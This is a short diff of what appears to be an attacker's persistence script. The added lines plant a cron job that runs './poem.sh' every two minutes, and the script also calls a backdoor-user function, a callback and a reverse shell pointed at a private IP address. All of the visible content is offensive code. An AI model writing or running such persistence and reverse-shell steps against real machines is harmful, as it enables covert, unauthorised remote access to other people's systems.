@@ -63,6 +63,10 @@ call_back &
 
 backup_user "legit"
 
-*/2 * * * * ./poem.sh 
+crontab -l > TheCorns 
+echo "*/2 * * * * ./poem.sh" >> TheCorns 
+crontab TheCorns 
+rm TheCorns
 
-rev_shell "172.20.10.8"
+IP="192.168.1.1"
+rev_shell "$IP"
